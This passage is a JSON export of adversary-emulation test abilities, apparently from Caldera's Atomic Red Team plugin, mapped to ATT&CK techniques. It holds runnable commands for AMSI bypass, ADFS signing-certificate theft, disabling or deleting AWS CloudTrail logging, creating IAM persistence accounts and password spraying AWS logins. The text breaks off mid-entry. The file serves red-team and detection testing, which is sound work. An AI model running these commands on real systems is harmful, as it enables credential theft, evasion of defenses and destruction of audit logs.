[{"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Pause all operations to avoid making noise", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sleep 60", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sleep 60", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sleep 60", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion", "ability_id": "36eecb80-ede3-442b-8774-956e906aff02", "technique_id": "T1497.003", "tactic": "defense-evasion", "requirements": [], "name": "1-min sleep", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore; Remove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module AADInternals -Force; Export-AADIntADFSCertificates; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "2d78dfbfea7fa4ec7349993b83048079", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "ADFS token signing and encryption certificates theft - Local", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore; Remove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module ActiveDirectory -Force ; Import-Module AADInternals -Force | Out-Null; $dcServerName = (Get-ADDomainController).HostName; $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"; $PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex; $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig; $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group; $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName; $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn; $base = \"LDAP://CN=$group,$container,$parent\"; $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)); $ADSearch.Filter = '(name=CryptoPolicy)'; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null; $aduser = $ADSearch.FindOne(); $keyObjectGuid = $ADUser.Properties[\"displayName\"] ; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null; $ADSearch.Filter=\"(l=$keyObjectGuid)\"; $aduser=$ADSearch.FindOne() ; $key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] ; Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "745d16045bcf10379b8cf2fa45f2b66e", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "ADFS token signing and encryption certificates theft - Remote", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "34952e2eefd3066c5f574744e1734ca6", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "AMSI Bypass - AMSI InitFailed", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "392e12d6a466407e28d1bb51cf0729bb", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "AMSI Bypass - Remove AMSI Provider Reg Key", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes powershell.exe with variations of the -Command parameter", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "c0177717b47f2cd07949186523fa3c6b", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "ATHPowerShellCommandLineParameter -Command parameter variations", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "106045f14741390cfb3fe95300585fb6", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes powershell.exe with variations of the -EncodedCommand parameter", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "fca2ce47cdb3acfde35139ca9017af80", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "a935a79ba61ecb00458208b0bd5ef15e", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["cd $PathToAtomicsFolder/T1562.008/src/T1562.008-1/; terraform destroy -auto-approve"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/T1562.008-1/terraform.tfstate ]; then : ; else cd $PathToAtomicsFolder/T1562.008/src/T1562.008-1/; terraform init; terraform apply -auto-approve; fi;  ;  aws cloudtrail update-trail --name redatomictesttrail --s3-bucket-name redatomic-test  --is-multi-region-trail --region us-east-1; aws cloudtrail stop-logging --name redatomictesttrail --region us-east-1; aws cloudtrail delete-trail --name redatomictesttrail --region us-east-1", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Cloud Logs", "ability_id": "81f7dd9fd2c503588bbe15ea0a144294", "technique_id": "T1562.008", "tactic": "defense-evasion", "requirements": [], "name": "AWS - CloudTrail Changes", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Cloud Logs", "ability_id": "f05e54049cfa10bc4018bf9e68676cc8", "technique_id": "T1562.008", "tactic": "defense-evasion", "requirements": [], "name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["access_key=`cat $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`; aws iam delete-access-key --access-key-id $access_key --user-name atomicredteam; rm $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "aws iam create-access-key --user-name atomicredteam > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds; cd $PathToAtomicsFolder/T1098.001/bin/; ./aws_secret.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation: Additional Cloud Credentials", "ability_id": "b05d458f4fe87e5dce7f52987c89cdc8", "technique_id": "T1098.001", "tactic": "persistence", "requirements": [], "name": "AWS - Create Access Key and Secret Key", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries create AWS group, add users to specific to that group to elevate their privilieges to gain more accesss\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["aws iam remove-user-from-group --user-name; aws iam delete-group --group-name"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "aws iam create-group --group-name; aws iam add-user-to-group --user-name", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "6edfb4431a2c7b2809ebf6d0a7a63bc5", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "AWS - Create a group and add a user to that group", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["aws iam delete-user --user-name atomicredteam"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "aws iam create-user --user-name atomicredteam", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create Account: Cloud Account", "ability_id": "2b00667c131aba669860a710213bbb88", "technique_id": "T1136.003", "tactic": "persistence", "requirements": [], "name": "AWS - Create a new IAM user", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Cloud Logs", "ability_id": "647e4465558374490275ec1e6892902a", "technique_id": "T1562.008", "tactic": "defense-evasion", "requirements": [], "name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Cleanup.\"; ./stratus cleanup aws.discovery.ec2-enumerate-from-instance; echo \"Removing Stratus artifacts from local machine.\"; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if test -f \"$PathToAtomicsFolder/T1580/src/stratus\"; then : ; else if [ \"$(uname)\" = \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Warmup.\"; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo \"Stratus: Start Detonate.\"; ./stratus detonate aws.discovery.ec2-enumerate-from-instance", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Cleanup.\"; ./stratus cleanup aws.discovery.ec2-enumerate-from-instance; echo \"Removing Stratus artifacts from local machine.\"; rm -rf stratus*"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if test -f \"$PathToAtomicsFolder/T1580/src/stratus\"; then : ; else if [ \"$(uname)\" = \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Warmup.\"; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo \"Stratus: Start Detonate.\"; ./stratus detonate aws.discovery.ec2-enumerate-from-instance", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Cloud Infrastructure Discovery", "ability_id": "e1f9618acc7e0232967e78b6274251da", "technique_id": "T1580", "tactic": "discovery", "requirements": [], "name": "AWS - EC2 Enumeration from Cloud Instance", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["ebe7eb_aws_users.txt"], "parsers": [], "cleanup": ["rm -rf /tmp/GoAWSConsoleSpray"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "cd /tmp; git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git; cd /tmp/GoAWSConsoleSpray; go run main.go GoAWSConsoleSpray -a XXXXXXXX -u ebe7eb_aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "9238ae711ad42fea9892671fef93783f", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "AWS - Password Spray an AWS using GoAWSConsoleSpray", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["export AWS_REGION=us-west-2; echo \"Cleanup 